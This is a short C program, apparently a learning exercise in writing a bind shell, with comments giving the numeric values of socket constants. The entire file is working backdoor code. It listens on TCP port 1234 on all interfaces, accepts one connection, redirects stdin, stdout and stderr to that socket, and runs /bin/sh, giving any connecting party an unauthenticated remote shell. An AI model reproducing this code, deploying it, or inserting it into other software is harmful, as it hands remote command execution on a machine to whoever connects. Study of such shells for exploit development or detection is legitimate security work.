#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(void)
{
 int clientfd, sockfd;
 int port = 1234;
 struct sockaddr_in mysockaddr;

 sockfd = socket(AF_INET, SOCK_STREAM, 0);
 mysockaddr.sin_family = AF_INET; //--> can be represented in numeric as 2
 mysockaddr.sin_port = htons(port);
 mysockaddr.sin_addr.s_addr = INADDR_ANY;// --> can be represented in numeric as 0 which means to bind to all interfaces

 bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

 listen(sockfd, 1);

 clientfd = accept(sockfd, NULL, NULL);

 dup2(clientfd, 0);
 dup2(clientfd, 1);
 dup2(clientfd, 2);
 char * const argv[] = {"sh",NULL, NULL};
 execve("/bin/sh", argv, NULL);
 return 0;
}
